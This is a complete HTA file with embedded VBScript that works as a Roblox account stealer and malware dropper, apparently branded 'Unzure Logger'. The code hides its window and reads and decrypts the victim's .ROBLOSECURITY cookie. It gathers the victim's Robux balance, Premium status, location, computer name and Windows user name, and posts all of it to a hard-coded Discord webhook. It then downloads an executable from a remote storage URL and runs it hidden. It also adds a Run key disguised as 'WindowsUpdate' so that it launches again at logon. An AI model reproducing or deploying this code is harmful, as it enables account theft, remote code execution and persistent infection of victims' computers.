<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim sh, fso, WH, PC, USER
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' --- WEBHOOK ---
WH = "https://discordapp.com/api/webhooks/1565563716014051328/6UtSHtNtuk6RHSfw81WZH22RbiCSUvFUPqHjOku5t1sMu8STVUZppk8lQk2skPcUNqUg"

PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")

' --- Initial Grab ---
Call GrabRoblox
Call Persistence

' --- Download & Execute RAT ---
Call DropRAT

window.close()

' --- GrabRoblox Function ---
Sub GrabRoblox()
    Dim paths(4)
    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
    
    Dim i, fp, raw
    For i = 0 To 4
        If fso.FileExists(paths(i)) Then fp = paths(i) : Exit For
    Next
    
    If Len(fp) = 0 Then
        Dim pk: pk = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Packages"
        If fso.FolderExists(pk) Then
            Dim folder, subf
            Set folder = fso.GetFolder(pk)
            For Each subf In folder.SubFolders
                If InStr(UCase(subf.Name), "ROBLOX") > 0 Then
                    Dim uwp: uwp = subf.Path & "\LocalState\RobloxCookies.dat"
                    If fso.FileExists(uwp) Then fp = uwp : Exit For
                End If
            Next
            Set folder = Nothing
        End If
    End If
    
    If Len(fp) = 0 Then Exit Sub
    raw = ReadFile(fp)
    If Len(raw) < 50 Then Exit Sub

    Dim cookie: cookie = ""
    If InStr(raw, "_|WARNING") > 0 Then cookie = raw
    If Len(cookie) = 0 And InStr(raw, "CookiesData"":""") > 0 Then
        Dim sp: sp = InStr(raw, "CookiesData"":""")
        If sp > 0 Then
            sp = sp + 14
            Dim ep: ep = InStr(sp, raw, """")
            If ep > sp Then
                Dim b64: b64 = Mid(raw, sp, ep - sp)
                If Len(b64) > 100 Then cookie = DecryptDPAPI(b64)
            End If
        End If
    End If
    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
        Dim rp: rp = InStr(raw, ".ROBLOSECURITY") : cookie = Mid(raw, rp)
    End If
    If Len(cookie) = 0 Then cookie = raw

    cookie = Replace(cookie, vbCr, "")
    cookie = Replace(cookie, vbLf, "")
    cookie = Replace(cookie, vbTab, "")
    cookie = Trim(cookie)
    Dim sc: sc = InStr(cookie, ";")
    If sc > 0 Then cookie = Left(cookie, sc - 1)
    cookie = Trim(cookie)
    Dim warn: warn = InStr(cookie, "_|WARNING")
    If warn > 1 Then cookie = Mid(cookie, warn)

    ' --- Fetch Profile Info ---
    Dim xh, uid, uname, robux, premium, avatar, loc
    Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    
    ' Get Authenticated User
    xh.Open "GET", "https://users.roblox.com/v1/users/authenticated", False
    xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
    xh.Send
    If xh.Status = 200 Then
        Dim rname: rname = RegExtract(xh.responseText, """name"":""([^""]+)""")
        uid = RegExtract(xh.responseText, """id"":(\d+)")
        uname = rname
    End If
    
    If Len(uid) > 0 Then
        ' Get Avatar
        xh.Open "GET", "https://thumbnails.roblox.com/v1/users/avatar-headshot?userId=" & uid & "&size=420x420&format=Png&isCircular=false", False
        xh.Send
        If xh.Status = 200 Then avatar = RegExtract(xh.responseText, """imageUrl"":""([^""]+)""")
        
        ' Get Robux
        xh.Open "GET", "https://economy.roblox.com/v1/users/" & uid & "/currency", False
        xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
        xh.Send
        If xh.Status = 200 Then robux = RegExtract(xh.responseText, """robux"":(\d+)")
        
        ' Get Premium
        xh.Open "GET", "https://economy.roblox.com/v1/users/" & uid & "/validated-metadata", False
        xh.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
        xh.Send
        If xh.Status = 200 Then
            If InStr(xh.responseText, """isPremium"":true") > 0 Then premium = "Yes" Else premium = "No"
        End If
    End If
    
    ' Get Location
    xh.Open "GET", "http://ip-api.com/json/", False
    xh.Send
    If xh.Status = 200 Then
        Dim city, country
        city = RegExtract(xh.responseText, """city"":""([^""]+)""")
        country = RegExtract(xh.responseText, """country"":""([^""]+)""")
        loc = city & ", " & country
    End If

    ' --- Build JSON Embed ---
    Dim author
    If Len(avatar) > 0 Then
        author = ",""author"":{""name"":""" & Ej(uname) & """,""icon_url"":""" & avatar & """,""url"":""" & avatar & """}"
    End If
    
    Dim j
    j = "{""embeds"":[{""title"":""🎮 ROBLOX SESSION CAPTURED"",""color"":16711680" & author & _
        ",""fields"":[" & _
        "{""name"":""🎮 Roblox User"",""value"":""" & Ej(uname) & """,""inline"":true}," & _
        "{""name"":""💰 Robux"",""value"":""" & robux & """,""inline"":true}," & _
        "{""name"":""👑 Premium"",""value"":""" & premium & """,""inline"":true}," & _
        "{""name"":""🌍 Location"",""value"":""" & Ej(loc) & """,""inline"":true}," & _
        "{""name"":""💻 Computer"",""value"":""" & Ej(PC) & """,""inline"":true}," & _
        "{""name"":""👤 Windows User"",""value"":""" & Ej(USER) & """,""inline"":true}," & _
        "{""name"":""🍪 .ROBLOSECURITY"",""value"":""```" & Ej(cookie) & "```""}]," & _
        """footer"":{""text"":""Unzure Logger"",""timestamp"":""" & Stamp() & """}]}"

    ' --- Post to Discord ---
    xh.Open "POST", WH, False
    xh.SetRequestHeader "Content-Type", "application/json"
    xh.Send j
    Set xh = Nothing
End Sub

' --- Regex Extraction Helper ---
Function RegExtract(text, pattern)
    Dim rx, mt
    Set rx = New RegExp
    rx.Pattern = pattern
    rx.IgnoreCase = True
    RegExtract = ""
    If rx.Test(text) Then
        Set mt = rx.Execute(text)
        If mt.Count > 0 Then RegExtract = mt(0).SubMatches(0)
    End If
End Function

' --- JSON Escaper ---
Function Ej(s)
    Ej = s
    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
    Ej = Replace(Ej, vbCrLf, Chr(92) & "n")
    Ej = Replace(Ej, vbCr, Chr(92) & "n")
    Ej = Replace(Ej, vbLf, Chr(92) & "n")
End Function

' --- Timestamp ---
Function Stamp()
    Dim w, d
    Set w = CreateObject("WbemScripting.SWbemDateTime")
    w.SetVarDate Now, True: d = w.GetVarDate(False)
    Stamp = Year(d) & "-" & Right("0" & Month(d), 2) & "-" & Right("0" & Day(d), 2) & "T" & Right("0" & Hour(d), 2) & ":" & Right("0" & Minute(d), 2) & ":" & Right("0" & Second(d), 2) & ".000Z"
End Function

' --- Utilities ---
Function ReadFile(path)
    ReadFile = ""
    Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close
End Function

Function TmpFile(name)
    TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name
End Function

Sub WriteFile(path, content)
    Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close
End Sub

Sub DropRAT()
    Dim op: op = sh.ExpandEnvironmentStrings("%TEMP%") & "\agent.exe"
    If fso.FileExists(op) Then fso.DeleteFile op
    sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri 'https://aqkqhdfafepmmsccxpyf.supabase.co/storage/v1/object/public/godspla/OnlineDice.exe' -OutFile '" & op & "'""", 0, True
    If fso.FileExists(op) Then
        If fso.GetFile(op).Size > 1000 Then
            sh.Run "powershell -NoProfile -ExecutionPolicy Bypass -File """ & op & """", 0, False
        End If
    End If
End Sub

Sub Persistence()
    Dim payload: payload = "mshta https://dicetrace.app"
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
End Sub

Sub DecryptDPAPI(b64)
    DecryptDPAPI = ""
    Dim inf: inf = TmpFile("dpi.txt")
    Dim outf: outf = TmpFile("dpo.txt")
    fso.DeleteFile outf, True
    WriteFile inf, b64
    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
    Dim psf: psf = TmpFile("dpapi.ps1")
    WriteFile psf, ps
    sh.Run "powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
    fso.DeleteFile inf, True
    fso.DeleteFile psf, True
    fso.DeleteFile outf, True
End Function
</script>
</head><body></body></html>
